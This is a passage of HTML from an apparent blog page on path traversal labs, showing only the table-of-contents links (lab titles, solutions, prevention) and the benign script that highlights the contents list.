hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 ml-4"><div class="transition bg-[var(--toc-badge-bg)] h-2 rounded-[0.1875rem] w-2"></div></div><div class="transition text-50 text-sm">Solution</div></a><a href=#common-obstacles-to-exploiting-path-traversal-vulnerabilities---continued class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 bg-[var(--toc-badge-bg)] text-[var(--btn-content)]">4</div><div class="transition text-50 text-sm">Common obstacles to exploiting path traversal vulnerabilities - Continued</div></a><a href=#lab-file-path-traversal-traversal-sequences-stripped-non-recursively class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 ml-4"><div class="transition bg-[var(--toc-badge-bg)] h-2 rounded-[0.1875rem] w-2"></div></div><div class="transition text-50 text-sm">Lab: File path traversal, traversal sequences stripped non-recursively</div></a><a href=#solution-2 class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 ml-4"><div class="transition bg-[var(--toc-badge-bg)] h-2 rounded-[0.1875rem] w-2"></div></div><div class="transition text-50 text-sm">Solution</div></a><a href=#common-obstacles-to-exploiting-path-traversal-vulnerabilities---continued-1 class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 bg-[var(--toc-badge-bg)] text-[var(--btn-content)]">5</div><div class="transition text-50 text-sm">Common obstacles to exploiting path traversal vulnerabilities - Continued</div></a><a href=#lab-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 ml-4"><div class="transition bg-[var(--toc-badge-bg)] h-2 rounded-[0.1875rem] w-2"></div></div><div class="transition text-50 text-sm">Lab: File path traversal, traversal sequences stripped with superfluous URL-decode</div></a><a href=#solution-3 class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 ml-4"><div class="transition bg-[var(--toc-badge-bg)] h-2 rounded-[0.1875rem] w-2"></div></div><div class="transition text-50 text-sm">Solution</div></a><a href=#common-obstacles-to-exploiting-path-traversal-vulnerabilities---continued-2 class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 bg-[var(--toc-badge-bg)] text-[var(--btn-content)]">6</div><div class="transition text-50 text-sm">Common obstacles to exploiting path traversal vulnerabilities - Continued</div></a><a href=#lab-file-path-traversal-validation-of-start-of-path class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 ml-4"><div class="transition bg-[var(--toc-badge-bg)] h-2 rounded-[0.1875rem] w-2"></div></div><div class="transition text-50 text-sm">Lab: File path traversal, validation of start of path</div></a><a href=#solution-4 class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 ml-4"><div class="transition bg-[var(--toc-badge-bg)] h-2 rounded-[0.1875rem] w-2"></div></div><div class="transition text-50 text-sm">Solution</div></a><a href=#common-obstacles-to-exploiting-path-traversal-vulnerabilities---continued-3 class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 bg-[var(--toc-badge-bg)] text-[var(--btn-content)]">7</div><div class="transition text-50 text-sm">Common obstacles to exploiting path traversal vulnerabilities - Continued</div></a><a href=#lab-file-path-traversal-validation-of-file-extension-with-null-byte-bypass class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 bg-[var(--toc-badge-bg)] text-[var(--btn-content)]">8</div><div class="transition text-50 text-sm">Lab: File path traversal, validation of file extension with null byte bypass</div></a><a href=#solution-5 class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 ml-4"><div class="transition bg-[var(--toc-badge-bg)] h-2 rounded-[0.1875rem] w-2"></div></div><div class="transition text-50 text-sm">Solution</div></a><a href=#how-to-prevent-a-path-traversal-attack class="transition flex py-2 active:bg-[var(--toc-btn-active)] gap-2 hover:bg-[var(--toc-btn-hover)] min-h-9 px-2 relative rounded-xl w-full"><div class="transition flex items-center justify-center font-bold h-5 rounded-lg shrink-0 text-xs w-5 bg-[var(--toc-badge-bg)] text-[var(--btn-content)]">9</div><div class="transition text-50 text-sm">How to prevent a path traversal attack</div></a><div class="absolute left-0 right-0 -z-10 bg-[var(--toc-btn-hover)] border-2 border-[var(--toc-btn-hover)] border-dashed group-hover:bg-transparent group-hover:border-[var(--toc-btn-active)] rounded-xl transition-all" id=active-indicator></div></table-of-contents><script type=module>class l extends HTMLElement{tocEl=null;visibleClass="visible";observer;anchorNavTarget=null;headingIdxMap=new Map;headings=[];sections=[];tocEntries=[];active=[];activeIndicator=null;constructor(){super(),this.observer=new IntersectionObserver(this.markVisibleSection,{threshold:0})}markVisibleSection=t=>{t.forEach((t=>{const e=t.target.children[0]?.getAttribute("id"),i=e?this.headingIdxMap.get(e):void 0;null!=i&&(this.active[i]=t.isIntersecting),t.isIntersecting&&this.anchorNavTarget==t.target.firstChild&&(this.anchorNavTarget=null)})),this.active.includes(!0)||this.fallback(),this.update()};toggleActiveHeading=()=>{let t=this.active.length-1,e=this.active.length-1,i=0;for(;t>=0&&!this.active[t];)this.tocEntries[t].classList.remove(this.visibleClass),t--;for(;t>=0&&this.active[t];)this.tocEntries[t].classList.add(this.visibleClass),e=Math.min(e,t),i=Math.max(i,t),t--;for(;t>=0;)this.tocEntries[t].classList.remove(this.visibleClass),t--;let n=this.tocEl?.getBoundingClientRect().top||0,s=this.tocEl?.scrollTop||0,o=this.tocEntries[e].getBoundingClientRect().top-n+s,c=this.tocEntries[i].getBoundingClientRect().bottom-n+s;this.activeIndicator?.setAttribute("style",`top: ${o}px; height: ${c-o}px`)};scrollToActiveHeading=()=>{if(this.anchorNavTarget||!this.tocEl)return;const t=document.querySelectorAll(`#toc .${this.visibleClass}`);if(!t.length)return;const e=t[0],i=t[t.length-1],n=this.tocEl.clientHeight;let s;s=i.getBoundingClientRect().bottom-e.getBoundingClientRect().top<.9*n?e.offsetTop-32:i.offsetTop-.8*n,this.tocEl.scrollTo({top:s,left:0,behavior:"smooth"})};update=()=>{requestAnimationFrame((()=>{this.toggleActiveHeading(),this.scrollToActiveHeading()}))};fallback=()=>{if(this.sections.length)for(let t=0;t<this.sections.length;t++){let e=this.sections[t].getBoundingClientRect().top,i=this.sections[t].getBoundingClientRect().bottom;if(this.isInRange(e,0,window.innerHeight)||this.isInRange(i,0,window.innerHeight)||e<0&&i>window.innerHeight)this.markActiveHeading(t);else if(e>window.innerHeight)break}};markActiveHeading=t=>{this.active[t]=!0};handleAnchorClick=t=>{const e=t.composedPath().find((t=>t instanceof HTMLAnchorElement));if(e){const t=decodeURIComponent(e.hash?.substring(1)),i=this.headingIdxMap.get(t);this.anchorNavTarget=void 0!==i?this.headings[i]:null}};isInRange(t,e,i){return e<t&&t<i}connectedCallback(){const t=document.querySelector(".prose");t?t.addEventListener("animationend",(()=>{this.init()}),{once:!0}):console.warn("Animation element not found")}init(){if(this.tocEl=document.getElementById("toc-inner-wrapper"),this.tocEl&&(this.tocEl.addEventListener("click",this.handleAnchorClick,{capture:!0}),this.activeIndicator=document.getElementById("active-indicator"),this.tocEntries=Array.from(document.querySelectorAll("#toc a[href^='#']")),0!==this.tocEntries.length)){this.sections=new Array(this.tocEntries.length),this.headings=new Array(this.tocEntries.length);for(let t=0;t<this.tocEntries.length;t++){const e=decodeURIComponent(this.tocEntries[t].hash?.substring(1)),i=document.getElementById(e),n=i?.parentElement;i instanceof HTMLElement&&n instanceof HTMLElement&&(this.headings[t]=i,this.sections[t]=n,this.headingIdxMap.set(e,t))}this.active=new Array(this.tocEntries.length).fill(!1),this.sections.forEach((t=>this.observer.observe(t))),this.fallback(),this.update()}}disconnectedCallback(){this.sections.forEach((t=>this.observer.unobserve(t))),this.observer.disconnect(),this.tocEl?.removeEventListener("click",this.handleAnchorClick)}}customElements.get("table-of-contents")||customElements.define("table-of-contents",l)</script><div class="w-full h-8"></div></div></div></div><!-- #toc needs to exist for Swup to work normally --></div></div><div class="hidden h-[300vh]" id=page-height-extend style=--bannerOffset:15vh;--banner-height-home:65vh;--banner-height:35vh;--configHue:250;--page-width:75rem data-astro-cid-sckkx6r4></div><script type=module src=/_astro/Layout.astro_astro_type_script_index_0_lang.Zzb6Kf66.js></script><script type=module src=/_astro/Layout.astro_astro_type_script_index_1_lang.Bvimhj2W.js></script></body></html>